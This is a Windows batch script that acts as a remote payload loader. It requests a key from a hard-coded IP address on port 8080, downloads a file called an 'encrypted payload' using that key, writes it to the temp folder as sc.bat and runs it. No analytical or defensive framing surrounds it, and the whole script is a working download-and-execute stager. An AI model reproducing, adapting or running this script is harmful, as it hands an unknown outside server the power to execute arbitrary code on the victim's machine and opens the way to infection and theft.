@echo off
setlocal enabledelayedexpansion

echo [INFO] ===== START =====

set BASE=http://82.29.153.101:8080
set FILE=%temp%\sc.bat
set TMPFILE=%temp%\raw_payload.txt
set KEYFILE=%temp%\key.txt

REM ===== TS =====
for /f %%i in ('powershell -NoP -Command "[int][DateTimeOffset]::UtcNow.ToUnixTimeSeconds()"') do set TS=%%i
echo [DEBUG] TS=%TS%

REM ===== KEY =====
echo [INFO] Requesting KEY...

powershell -NoP -Command ^
  "$r = Invoke-RestMethod '%BASE%/auth/key?ts=%TS%'; ^
   $r | Out-File -Encoding ASCII '%KEYFILE%'"

set /p KEY=<"%KEYFILE%"
echo [DEBUG] KEY=%KEY%

if "%KEY%"=="" (
    echo [ERROR] KEY vacia
    exit /b 1
)

REM ===== PAYLOAD =====
echo [INFO] Downloading payload...

powershell -NoP -Command ^
  "Invoke-WebRequest '%BASE%/payload/encrypted' ^
   -Headers @{ 'X-Decrypt-Key'='%KEY%' } ^
   -OutFile '%TMPFILE%'"

if not exist "%TMPFILE%" (
    echo [ERROR] No payload
    exit /b 1
)

for %%A in ("%TMPFILE%") do set SIZE=%%~zA
if %SIZE%==0 (
    echo [ERROR] Payload vacio
    exit /b 1
)

REM ===== NORMALIZE =====
powershell -NoP -Command ^
  "(Get-Content '%TMPFILE%' -Raw) -replace \"`r?`n\", \"`r`n\" | ^
   Out-File -Encoding ASCII '%FILE%'"

echo [INFO] Ejecutando payload...
cmd /c "%FILE%"

echo [INFO] Exit code: %errorlevel%
echo [INFO] ===== END =====

endlocal